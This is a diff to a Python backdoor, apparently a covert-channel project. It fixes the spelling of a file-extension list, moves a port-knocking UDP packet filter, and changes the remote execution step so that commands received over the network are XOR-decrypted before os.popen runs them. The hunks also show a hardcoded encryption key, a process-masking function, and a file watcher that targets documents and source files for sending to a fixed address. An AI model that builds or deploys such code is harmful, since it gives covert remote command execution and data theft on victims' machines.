@@ -54,10 +54,7 @@ SEND_PORT = 443
 # File watching variables
 WATCH_DIR = '/tmp/test'
 MASK = pyinotify.IN_MODIFY | pyinotify.IN_CREATE | pyinotify.IN_DELETE
-EXTENTIONS = '.pdf,.docx,.doc,.txt,.rb,.py'
-# Filter is tcpdump format
-FILTER = "udp and (dst port {0} or {1} or {2} or {3} or {4} or {5})".format(KNOCK[0], KNOCK[1],
-                                                                            KNOCK[2], KNOCK[3], KNOCK[4], CHANNEL)
+EXTENSIONS = '.pdf,.docx,.doc,.txt,.rb,.py'
 
 # Must make sure it is the same as the client
 ENCRYPTION_KEY = "zdehjk"
@@ -69,6 +66,9 @@ default_dest = '192.168.0.6'
 process_list = []
 watch_queue = Queue()
 
+# Filter is tcpdump format
+FILTER = "udp and (dst port {0} or {1} or {2} or {3} or {4} or {5})".format(KNOCK[0], KNOCK[1],
+                                                                            KNOCK[2], KNOCK[3], KNOCK[4], CHANNEL)
 
 
 ######################################################################
@@ -168,7 +168,7 @@ def remoteExecute(packet):
                 if command.startswith('watch') or command.startswith('remove') or command.startswith('twatch'):
                     watch_queue.put(command)
                 else:
-                    decrypt_command = os.popen(command)
+                    decrypt_command = os.popen(xor_crypt(command))
                     command_result = decrypt_command.read()
                     #print command_result
 
@@ -357,7 +357,7 @@ def mask_process():
 class EventHandler(pyinotify.ProcessEvent):
     global default_dest
 
-    def my_init(self, ext=EXTENTIONS):
+    def my_init(self, ext=EXTENSIONS):
         self.extensions = ext.split(',')
 
     def process_default(self, event):
